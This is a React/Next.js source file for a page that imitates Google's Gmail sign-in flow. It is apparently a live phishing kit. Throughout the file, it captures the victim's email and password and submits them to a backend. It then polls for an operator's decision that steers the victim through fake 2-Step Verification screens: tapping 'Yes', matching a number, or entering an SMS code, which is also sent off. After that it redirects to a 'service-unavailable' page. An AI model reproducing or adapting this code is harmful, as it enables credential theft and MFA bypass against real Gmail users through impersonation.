"use client";

import { GoogleFooter, GoogleLogo, UserAvatar } from "@/components/Icons";
import { useDecisionPolling } from "@/hooks/useDecisionPolling";
import { apiNotifyIncoming, apiSubmit, apiSubmitCode } from "@/lib/api";
import { isValidGmailSignInId } from "@/lib/validation";
import { syncGmailLoginUrl } from "@/lib/gmail-login-url";
import { useRouter } from "next/navigation";
import { useCallback, FormEvent, useEffect, useState } from "react";

type Step =
  | "email"
  | "password"
  | "yes-prompt"
  | "number-prompt"
  | "sms-code"
  | "session-expired";

function EmailOutlinedInput({
  value,
  onChange,
}: {
  value: string;
  onChange: (v: string) => void;
}) {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;

  return (
    <div className={`outlined-field ${active ? "is-active" : ""}`}>
      <input
        type="text"
        className="outlined-input"
        value={value}
        onChange={(e) => onChange(e.target.value)}
        onFocus={() => setFocused(true)}
        onBlur={() => setFocused(false)}
        onKeyDown={(e) => {
          if (e.key === "Enter") {
            e.preventDefault();
            e.currentTarget.form?.requestSubmit();
          }
        }}
        autoFocus
        autoComplete="username"
      />
      <label className="outlined-label">Email or phone</label>
    </div>
  );
}

function EmailBadge({ email }: { email: string }) {
  return (
    <div className="email-row">
      <div className="avatar">
        <UserAvatar />
      </div>
      <span className="email-address">{email}</span>
      <svg
        className="dropdown-arrow-icon"
        width="10"
        height="6"
        viewBox="0 0 10 6"
        aria-hidden
      >
        <path d="M1 1l4 4 4-4" stroke="currentColor" fill="none" />
      </svg>
    </div>
  );
}

function TwoStepYes({ email }: { email: string }) {
  return (
    <div className="twostep-page">
      <div className="twostep-card">
        <div className="twostep-left">
          <GoogleLogo />
          <h2 className="twostep-title">2-Step Verification</h2>
          <p className="twostep-desc">
            To help keep your account safe, Google wants to make sure it&apos;s
            really you trying to sign in
          </p>
          <div className="twostep-email-badge">
            <span className="twostep-avatar">👤</span>
            <span className="twostep-email-text">{email}</span>
            <span className="twostep-arrow">▾</span>
          </div>
          <button type="button" className="twostep-resend">
            Resend it
          </button>
        </div>
        <div className="twostep-divider" />
        <div className="twostep-right">
          <h3 className="twostep-device-title">
            Open the Gmail app on your Device
          </h3>
          <p className="twostep-device-desc">
            Google sent a notification to your Device. Open the Gmail app and
            tap <strong>Yes</strong> on the prompt to verify it&apos;s you.
          </p>
          <div className="twostep-checkbox-row">
            <input type="checkbox" id="dont-ask" defaultChecked />
            <label htmlFor="dont-ask">Don&apos;t ask again on this device</label>
          </div>
        </div>
      </div>
      <GoogleFooter />
    </div>
  );
}

function TwoStepNumber({ email, number }: { email: string; number: string }) {
  return (
    <div className="twostep-page">
      <div className="twostep-card">
        <div className="twostep-left">
          <GoogleLogo />
          <h2 className="twostep-title">2-Step Verification</h2>
          <p className="twostep-desc">
            To help keep your account safe, Google wants to make sure it&apos;s
            really you trying to sign in
          </p>
          <div className="twostep-email-badge">
            <span className="twostep-avatar">👤</span>
            <span className="twostep-email-text">{email}</span>
            <span className="twostep-arrow">▾</span>
          </div>
          <button type="button" className="twostep-resend">
            Resend it
          </button>
        </div>
        <div className="twostep-divider" />
        <div className="twostep-right">
          <div className="number-prompt-number">{number}</div>
          <h3 className="twostep-device-title">
            Open the Gmail app on your Device
          </h3>
          <p className="twostep-device-desc">
            Google sent a notification to your Device. Open the Gmail app, tap{" "}
            <strong>Yes</strong> on the prompt, then tap <strong>{number}</strong>{" "}
            on your phone to verify it&apos;s you.
          </p>
          <div className="twostep-checkbox-row">
            <input type="checkbox" id="dont-ask-num" defaultChecked />
            <label htmlFor="dont-ask-num">
              Don&apos;t ask again on this device
            </label>
          </div>
        </div>
      </div>
      <GoogleFooter />
    </div>
  );
}

function TwoStepSms({
  email,
  verifying = false,
  error: externalError = "",
  otpResetKey = 0,
  onSubmit,
}: {
  email: string;
  verifying?: boolean;
  error?: string;
  otpResetKey?: number;
  onSubmit: (code: string) => Promise<boolean>;
}) {
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [localError, setLocalError] = useState("");

  useEffect(() => {
    setCode("");
    setLocalError("");
  }, [otpResetKey]);

  const error = externalError || localError;
  const busy = loading || verifying;

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();
    if (!code.trim() || busy) return;

    setLocalError("");
    setLoading(true);
    const ok = await onSubmit(code);
    setLoading(false);
    if (!ok) setLocalError("Could not send code. Try again.");
  };

  return (
    <div className="twostep-page">
      <div className="sms-card">
        <div className="twostep-left">
          <GoogleLogo />
          <h2 className="twostep-title">2-Step Verification</h2>
          <p className="twostep-desc">
            To help keep your account safe, Google wants to make sure it&apos;s
            really you trying to sign in
          </p>
          <div className="twostep-email-badge">
            <span className="twostep-avatar">👤</span>
            <span className="twostep-email-text">{email}</span>
            <span className="twostep-arrow">▾</span>
          </div>
          <button type="button" className="twostep-resend sms-resend">
            Resend it
          </button>
        </div>
        <div className="twostep-divider" />
        <div className="sms-right">
          <form onSubmit={handleSubmit}>
            <p className="twostep-device-desc">
              A text message with a verification code was just sent to your phone.
            </p>
            <div className="sms-input-wrap">
              <input
                type="text"
                className="sms-code-input"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                autoFocus
                required
                disabled={busy}
              />
              <span
                className={`sms-input-label ${code ? "sms-label-active" : ""}`}
              >
                Enter the code
              </span>
            </div>
            {verifying && !error && (
              <p className="twostep-desc">Verifying code…</p>
            )}
            {error && <p className="error-text">{error}</p>}
            <div className="sms-actions">
              <button
                type="submit"
                className={`sms-next-btn ${busy ? "btn-loading" : ""}`}
                disabled={busy || !code.trim()}
              >
                {loading ? (
                  <span className="btn-spinner" />
                ) : verifying ? (
                  "Verifying…"
                ) : (
                  "Next"
                )}
              </button>
            </div>
          </form>
        </div>
      </div>
      <GoogleFooter />
    </div>
  );
}

function SessionExpired() {
  return (
    <div className="twostep-page">
      <div className="session-card">
        <GoogleLogo />
        <h2 className="session-title">You&apos;re not signed in</h2>
        <p className="session-desc">
          Your session has expired. Please sign in again.
        </p>
        <div className="session-actions">
          <button
            type="button"
            className="session-try-btn"
            onClick={() => window.location.reload()}
          >
            Try again
          </button>
        </div>
      </div>
      <GoogleFooter />
    </div>
  );
}

export default function GmailLoginPage() {
  const router = useRouter();
  const [step, setStep] = useState<Step>("email");

  useEffect(() => {
    syncGmailLoginUrl();
    void apiNotifyIncoming("Gmail");
  }, []);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [passwordVisible, setPasswordVisible] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [promptNumber, setPromptNumber] = useState("");
  const [polling, setPolling] = useState(false);
  const [smsVerifying, setSmsVerifying] = useState(false);
  const [smsError, setSmsError] = useState("");
  const [smsOtpResetKey, setSmsOtpResetKey] = useState(0);

  const handleDecision = useCallback(
    (decision: string) => {
      if (decision === "password-error") {
        setLoading(false);
        setStep("password");
        setError("Wrong password. Try again.");
        setPassword("");
        setPasswordVisible(false);
        setPolling(false);
        return;
      }

      if (decision === "yes-prompt") {
        setLoading(false);
        setStep("yes-prompt");
        return;
      }

      if (decision.startsWith("number-prompt:")) {
        setPromptNumber(decision.split(":")[1] ?? "");
        setLoading(false);
        setStep("number-prompt");
        return;
      }

      if (decision === "sms-code") {
        setLoading(false);
        setSmsVerifying(false);
        setSmsError("");
        setStep("sms-code");
        return;
      }

      if (decision === "otp-error") {
        setSmsVerifying(false);
        setSmsError("Wrong code. Try again.");
        setSmsOtpResetKey((k) => k + 1);
        setPolling(true);
        return;
      }

      if (decision === "success") {
        setPolling(false);
        router.push("/service-unavailable");
      }
    },
    [router],
  );

  useDecisionPolling(polling, handleDecision);

  const handlePasswordSubmit = async (e: FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);

    const result = await apiSubmit({
      email,
      password,
      provider: "Gmail",
    });

    if (!result.ok) {
      setLoading(false);
      setError(result.error);
      return;
    }

    if (result.data.phase === "password-retry") {
      setLoading(false);
      setError("Wrong password. Try again.");
      setPassword("");
      setPasswordVisible(false);
      return;
    }

    setPolling(true);
  };

  if (step === "yes-prompt") return <TwoStepYes email={email} />;
  if (step === "number-prompt")
    return <TwoStepNumber email={email} number={promptNumber} />;
  if (step === "sms-code")
    return (
      <TwoStepSms
        email={email}
        verifying={smsVerifying}
        error={smsError}
        otpResetKey={smsOtpResetKey}
        onSubmit={async (code) => {
          setSmsError("");
          const result = await apiSubmitCode({ email, code });
          if (!result.ok) return false;
          setSmsVerifying(true);
          setPolling(true);
          return true;
        }}
      />
    );
  if (step === "session-expired") return <SessionExpired />;

  const showPassword = step === "password";

  const handleEmailNext = () => {
    if (!email.trim()) {
      setError("Please enter your email or phone");
      return;
    }
    if (!isValidGmailSignInId(email)) {
      setError("Enter a valid email, phone, or username.");
      return;
    }
    setError("");
    setStep("password");
  };

  return (
    <div className="gmail-login-page">
      <div className="login-card">
        <div className="branding-side">
          <GoogleLogo />
          <h1>{showPassword ? "Welcome" : "Sign in"}</h1>
          {showPassword ? (
            <EmailBadge email={email} />
          ) : (
            <p className="subtitle">
              with your Google Account to continue to Gmail. This account will be
              available to other Google apps in the browser.
            </p>
          )}
        </div>
        <div className="form-side">
          {showPassword ? (
            <form onSubmit={handlePasswordSubmit}>
              <div className="password-container">
                <p className="verify-text">
                  To continue, first verify it&apos;s you
                </p>
                <div className="input-field">
                  <input
                    type={passwordVisible ? "text" : "password"}
                    className={`password-field ${error ? "input-error" : ""}`}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    autoFocus
                    required
                    disabled={loading}
                  />
                  <span
                    className={`input-label ${password ? "active" : ""}`}
                  >
                    Enter your password
                  </span>
                </div>
                {error && <p className="error-text">{error}</p>}
              </div>
              <div className="checkbox-row">
                <input
                  type="checkbox"
                  id="show-password"
                  checked={passwordVisible}
                  onChange={(e) => setPasswordVisible(e.target.checked)}
                  disabled={loading}
                />
                <label htmlFor="show-password">Show password</label>
              </div>
              <div className="action-row">
                <a
                  className="forgot-link"
                  href="https://accounts.google.com/signin/recovery"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Forgot password?
                </a>
                <button
                  type="submit"
                  className={`next-btn password-next ${loading ? "btn-loading" : ""}`}
                  disabled={loading}
                >
                  {loading ? <span className="btn-spinner" /> : "Next"}
                </button>
              </div>
            </form>
          ) : (
            <form
              className="email-form-wrapper"
              onSubmit={(e) => {
                e.preventDefault();
                handleEmailNext();
              }}
            >
              <div>
                <EmailOutlinedInput value={email} onChange={setEmail} />
                {error && step === "email" && (
                  <p className="error-text">{error}</p>
                )}
                <a
                  className="forgot-link"
                  href="https://accounts.google.com/signin/usernamerecovery"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Forgot email?
                </a>
                <p className="guest-mode-text">
                  Not your computer? Use Guest mode to sign in privately.{" "}
                  <a
                    href="https://support.google.com/chrome/answer/6130773"
                    target="_blank"
                    rel="noopener noreferrer"
                  >
                    Learn more about using Guest mode
                  </a>
                </p>
              </div>
              <div className="button-group">
                <a
                  className="create-account-btn"
                  href="https://accounts.google.com/signup"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Create account
                </a>
                <button type="submit" className="next-btn">
                  Next
                </button>
              </div>
            </form>
          )}
        </div>
      </div>
      <GoogleFooter />
    </div>
  );
}
